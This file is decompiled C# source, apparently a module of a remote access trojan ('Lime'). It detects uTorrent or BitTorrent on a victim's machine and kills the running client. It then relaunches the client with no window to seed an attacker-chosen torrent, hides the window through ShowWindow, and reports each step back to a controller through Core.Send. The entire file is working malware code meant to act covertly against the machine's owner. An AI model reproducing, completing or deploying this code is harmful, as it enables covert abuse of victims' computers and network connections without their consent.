using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Lime;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Torrent
{
	public static string UTorrentLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\uTorrent\\uTorrent.exe";

	public static string BitLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BitTorrent\\BitTorrent.exe";

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	public static void SeedTorrent(string path)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 222:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_0025;
						case 6:
							goto IL_0043;
						case 7:
							goto IL_004c;
						case 8:
							goto IL_005e;
						case 10:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
						case 9:
						case 11:
						case 12:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_005e:
					num = 8;
					Core.Send("MSG" + Core.Y + "Seeding with uTorrent");
					goto end_IL_0001_3;
					IL_004c:
					num = 7;
					SeedIt(UTorrentLocalPath, UTorrentLocalPath, path);
					goto IL_005e;
					IL_000a:
					num = 2;
					if (IsBitTorrent())
					{
						goto IL_0013;
					}
					goto IL_0043;
					IL_0013:
					num = 3;
					SeedIt(BitLocalPath, BitLocalPath, path);
					goto IL_0025;
					IL_0025:
					num = 4;
					Core.Send("MSG" + Core.Y + "Seeding with BitTorrent");
					goto end_IL_0001_3;
					IL_0043:
					num = 6;
					if (!IsUtorrent())
					{
						break;
					}
					goto IL_004c;
					end_IL_0001_2:
					break;
				}
				num = 10;
				Core.Send("MSG" + Core.Y + "No Torrent Software Installed");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 222;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static string GetFileNameFromURL(string URL)
	{
		try
		{
			return URL.Substring(checked(URL.LastIndexOf("/", StringComparison.Ordinal) + 1));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return URL;
		}
	}

	public static bool IsUtorrent()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool result = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 76:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0018;
						case 4:
						case 5:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0018:
					num = 3;
					result = true;
					goto end_IL_0001_3;
					IL_000a:
					num = 2;
					if (!File.Exists(UTorrentLocalPath))
					{
						break;
					}
					goto IL_0018;
					end_IL_0001_2:
					break;
				}
				num = 5;
				result = false;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 76;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool IsBitTorrent()
	{
		if (File.Exists(BitLocalPath))
		{
			return true;
		}
		return false;
	}

	public static void SeedIt(string ClientPath, string LocalPath, string TorrentPath)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 303:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_001b;
						case 5:
							goto IL_004e;
						case 6:
							goto IL_0057;
						case 7:
							goto IL_0060;
						case 8:
							goto IL_0069;
						case 9:
							goto IL_007c;
						case 10:
							goto IL_0090;
						case 11:
							goto IL_009a;
						case 12:
							goto IL_00aa;
						case 14:
							goto IL_00b9;
						case 15:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 13:
						case 16:
						case 17:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00b9:
					num = 14;
					if (!ClientPath.Contains("BitTorrent"))
					{
						goto end_IL_0001_3;
					}
					break;
					IL_00aa:
					num = 12;
					HideIt("uTorrent");
					goto end_IL_0001_3;
					IL_000a:
					num = 2;
					processStartInfo = new ProcessStartInfo();
					goto IL_0012;
					IL_0012:
					num = 3;
					processStartInfo.FileName = ClientPath;
					goto IL_001b;
					IL_001b:
					num = 4;
					processStartInfo.Arguments = "/" + LocalPath + " \"" + TorrentPath + "\"";
					goto IL_004e;
					IL_004e:
					num = 5;
					processStartInfo.CreateNoWindow = true;
					goto IL_0057;
					IL_0057:
					num = 6;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_0060;
					IL_0060:
					num = 7;
					processStartInfo.ErrorDialog = false;
					goto IL_0069;
					IL_0069:
					num = 8;
					Process.GetProcessesByName("BitTorrent")[0].Kill();
					goto IL_007c;
					IL_007c:
					num = 9;
					Process.GetProcessesByName("uTorrent")[0].Kill();
					goto IL_0090;
					IL_0090:
					num = 10;
					Process.Start(processStartInfo);
					goto IL_009a;
					IL_009a:
					num = 11;
					if (ClientPath.Contains("uTorrent"))
					{
						goto IL_00aa;
					}
					goto IL_00b9;
					end_IL_0001_2:
					break;
				}
				num = 15;
				HideIt("BitTorrent");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 303;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void HideIt(string TorrentClient)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 95:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0016;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0016:
					num = 3;
					processesByName = Process.GetProcessesByName(TorrentClient);
					break;
					IL_000a:
					num = 2;
					Thread.Sleep(1000);
					goto IL_0016;
					end_IL_0001_2:
					break;
				}
				num = 4;
				ShowWindow(processesByName[0].MainWindowHandle.ToInt32(), 0);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 95;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
